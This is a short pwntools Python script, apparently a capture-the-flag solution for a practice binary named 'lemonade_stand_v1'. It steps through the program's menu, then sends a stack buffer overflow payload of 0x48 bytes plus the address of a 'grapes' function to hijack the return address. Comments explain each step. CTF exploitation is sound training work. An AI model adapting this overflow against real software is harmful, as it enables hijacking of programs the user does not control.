from pwn import *

#r = remote('the.ip.of.chal', 12345) ## This would be the real version you connect to after verifying below works
r = process('./lemonade_stand_v1') ## r will be an active running process of the program
elf = ELF('./lemonade_stand_v1') ## elf gives functionalities for manipulating the process

r.sendlineafter('>>', b'2') ## Choose 2 to remove 5 coins; 7 left
r.sendlineafter('>>', b'2') ## Choose 2 to remove 5 coins; 2 left
r.sendlineafter('>>', b'1') ## Choose 2 to try to remove 3 coins; too few left
r.sendlineafter('>>', b'1') ## Choose 1 to get to enter name (vulnerable input functions!)
r.sendlineafter('name: ', b'pwned') ## Enter a random first name 
payload = b'x' * 0x48 + p64(elf.sym.get('grapes')) ## Buffersize characters + address of grapes gotten from the elf
r.sendlineafter(b'surname: ', payload)  ## Sending payload will buffer overflow and overwrite return address
r.interactive() ## To be able to interact with the program and retrieve flag